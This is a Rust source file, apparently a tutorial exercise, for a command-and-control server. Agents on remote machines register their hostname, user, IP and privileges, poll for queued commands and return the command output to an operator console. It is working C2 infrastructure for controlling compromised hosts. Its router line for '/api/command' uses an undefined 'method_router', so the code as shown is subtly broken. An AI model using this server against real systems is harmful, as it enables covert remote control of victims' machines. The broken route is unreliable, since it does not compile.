use axum::{
    Router,
    extract::State,
    http::StatusCode,
    response::Json,
    routing::{get, post},
};
use chrono::Utc;
use std::{
    collections::VecDeque,
    net::SocketAddr,
    sync::{Arc, Mutex},
};

use crate::models::*;

/// Type alias for our shared state
type SharedState = Arc<Mutex<AppState>>;

/// Start the C2 HTTP server
pub async fn start_server() {
    // Create shared state that will be accessible to all handlers
    let state = Arc::new(Mutex::new(AppState::new()));

    // Build the router with all endpoints
    let app = Router::new()
        .route("/api/register", post(handle_register))
        .route("/api/beacon", post(handle_beacon))
        .route("/api/result", post(handle_result))
        .route("/api/command",  method_router)
        // Future: Add more routes here
        .with_state(state);

    // Bind to address
    let addr = SocketAddr::from(([0, 0, 0, 0], 8080));
    println!("🚀 C2 Server listening on http://{}", addr);
    println!("📡 Waiting for agents to connect...\n");

    // Start the server
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

// ============================================================================
// ENDPOINT 1: REGISTRATION (✅ FULLY IMPLEMENTED - STUDY THIS)
// ============================================================================

/// Handle agent registration
///
/// This is a COMPLETE implementation - study how it works!
///
/// **Key Concepts:**
/// 1. `State(state)` - Extracts shared state from Axum
/// 2. `Json(req)` - Deserializes JSON body into RegisterRequest
/// 3. `state.lock().unwrap()` - Gets mutable access to shared data
/// 4. We return `Json(response)` which Axum serializes to JSON
async fn handle_register(
    State(state): State<SharedState>,
    Json(req): Json<RegisterRequest>,
) -> Json<RegisterResponse> {
    println!("📥 Registration request from agent: {}", req.agent_id);

    // Lock the state to modify it
    let mut state = state.lock().unwrap();

    // Create Agent struct from request
    let agent = Agent {
        id: req.agent_id.clone(),
        hostname: req.hostname,
        os: req.os,
        os_version: req.os_version,
        user: req.user,
        ip: req.ip,
        privileges: req.privileges,
        version: req.version,
        last_seen: Utc::now(),
        first_seen: Utc::now(),
    };

    // Store agent in HashMap
    state.agents.insert(req.agent_id.clone(), agent.clone());

    // Initialize empty command queue for this agent
    state
        .command_queues
        .insert(req.agent_id.clone(), VecDeque::new());

    println!("✅ Agent registered: {} ({})", agent.hostname, agent.id);
    println!(
        "   OS: {} | User: {} | IP: {}",
        agent.os, agent.user, agent.ip
    );

    // Return success response
    Json(RegisterResponse {
        success: true,
        message: "Agent registered successfully".to_string(),
        beacon_interval: 10, // Agent should beacon every 10 seconds
    })
}

// ============================================================================
// ENDPOINT 2: BEACON (⚠️ PARTIALLY IMPLEMENTED - YOU FINISH THIS)
// ============================================================================

/// Handle agent beacon (check-in)
///
/// **YOUR TASK:**
/// 1. Extract the agent_id from the request
/// 2. Update the agent's last_seen timestamp
/// 3. Get pending commands from the queue for this agent
/// 4. Return the commands to the agent
///
/// **HINTS:**
/// - Use `state.lock().unwrap()` to access state
/// - Update: `state.agents.get_mut(&agent_id)`
/// - Get commands: `state.command_queues.get_mut(&agent_id)`
/// - Return: `Json(BeaconResponse { commands: vec })`
async fn handle_beacon(
    State(state): State<SharedState>,
    Json(req): Json<BeaconRequest>,
) -> Json<BeaconResponse> {
    println!("💓 Beacon from agent: {}", req.agent_id);

    // TODO: Lock the state
    let mut state = state.lock().unwrap();

    // TODO: Update the agent's last_seen timestamp
    // HINT: if let Some(agent) = state.agents.get_mut(&req.agent_id) { ... }

    if let Some(agent) = state.agents.get_mut(&req.agent_id) {
        agent.last_seen = Utc::now();
    } else {
        println!("⚠️ Warning: Beacon from unknown agent: {}", req.agent_id);
    }

    // TODO: Get pending commands from the queue
    // HINT:
    // let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
    //     queue.drain(..).collect()  // This removes all commands from queue
    // } else {
    //     Vec::new()
    // };

    let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
        queue.drain(..).collect()
    } else {
        Vec::new()
    };

    // TODO: Return the commands
    // For now, returning empty list - YOU IMPLEMENT THE ABOVE
    Json(BeaconResponse { commands })
}

// ============================================================================
// ENDPOINT 3: RESULT (❌ NOT IMPLEMENTED - YOU IMPLEMENT THIS)
// ============================================================================

/// Handle command result from agent
///
/// **YOUR TASK:** Implement this completely!
///
/// **What it should do:**
/// 1. Receive ResultRequest from agent
/// 2. Create a CommandResult struct
/// 3. Store it in state.results HashMap (key: command_id)
/// 4. Print the result to console
/// 5. Return success response
///
/// **SIGNATURE:**
/// async fn handle_result(
///     State(state): State<SharedState>,
///     Json(req): Json<ResultRequest>,
/// ) -> Json<ResultResponse>
///
/// **STEPS:**
/// 1. Print "📨 Result received for command: {}"
/// 2. Lock state
/// 3. Create CommandResult { agent_id, command_id, success, output, timestamp }
/// 4. Insert into state.results
/// 5. Print the output
/// 6. Return Json(ResultResponse { success: true })
async fn handle_result(
    State(state): State<SharedState>,
    Json(req): Json<ResultRequest>,
) -> Json<ResultResponse> {
    // TODO: IMPLEMENT THIS FUNCTION
    // Follow the same pattern as handle_register

    println!("📨 Result received for command: {}", req.command_id);

    // Lock the state
    let mut state = state.lock().unwrap();

    let command_result = CommandResult {
        agent_id: req.agent_id.clone(),
        command_id: req.command_id.clone(),
        success: req.success,
        output: req.output.clone(),
        timestamp: Utc::now(),
    };

    state.results.insert(req.command_id.clone(), command_result);

    println!("   Output:\n{}", req.output);

    Json(ResultResponse { success: true })
}

// ============================================================================
// HELPER FUNCTIONS (FOR FUTURE USE)
// ============================================================================

/// Add a command to an agent's queue (will be called from CLI later)
pub fn queue_command(
    state: &mut AppState,
    agent_id: String,
    command_type: CommandType,
    payload: String,
) -> Result<String, String> {
    // Check if agent exists
    if !state.agents.contains_key(&agent_id) {
        return Err(format!("Agent {} not found", agent_id));
    }

    // Create command with unique ID
    let command_id = uuid::Uuid::new_v4().to_string();
    let command = Command {
        id: command_id.clone(),
        agent_id: agent_id.clone(),
        command_type,
        payload,
        created_at: Utc::now(),
    };

    // Add to queue
    if let Some(queue) = state.command_queues.get_mut(&agent_id) {
        queue.push_back(command);
        Ok(command_id)
    } else {
        Err("Failed to access command queue".to_string())
    }
}

/// Get all registered agents (will be used by CLI)
pub fn get_agents(state: &AppState) -> Vec<Agent> {
    state.agents.values().cloned().collect()
}

/// Get result for a command (will be used by CLI to check if result ready)
pub fn get_result(state: &AppState, command_id: &str) -> Option<CommandResult> {
    state.results.get(command_id).cloned()
}
